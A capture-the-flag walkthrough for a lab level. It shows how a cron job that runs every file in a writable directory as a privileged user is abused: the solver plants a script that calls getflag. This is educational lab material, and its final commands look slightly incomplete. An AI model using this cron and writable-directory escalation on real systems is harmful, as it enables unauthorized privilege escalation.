## level05

The system welcoming us with this message: `You have new mail.`

```bash
$ cat $MAIL

*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

Check this out: [сrontab.guru](https://crontab.guru/#*/2_*_*_*_*)

As we can understand, a cron is running on the system.
To ensure that use `top` command.

Every two minutes `/usr/sbin/openarenaserver` will be run with flag05 privileges.

From the beginning I started look the info about openarenaserver, but it is worthless as <br>
`/usr/sbin/openarenaserver` is a bash script:
```bash
$> cat /usr/sbin/openarenaserver

#!/bin/sh

for i in /opt/openarenaserver/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
done
```

Every two minutes, all the files in the `/opt/openarenaserver/` will be run using bash and have only 5sec to execute. 

If we look at the acl of this folder, we'll see that level05 and flag05 are allowed to write into this directory.
```bash
getfacl /opt/openarenaserver
```

So the solution is to create a script, change the exec bit and wait 2 minutes.
```bash
echo 'getflag > /opt/openarenaserver/flag' > run.sh
chmod +x run.sh
```

:warning: Watch carefully and do not miss the flag, after 2 minutes script will delete it!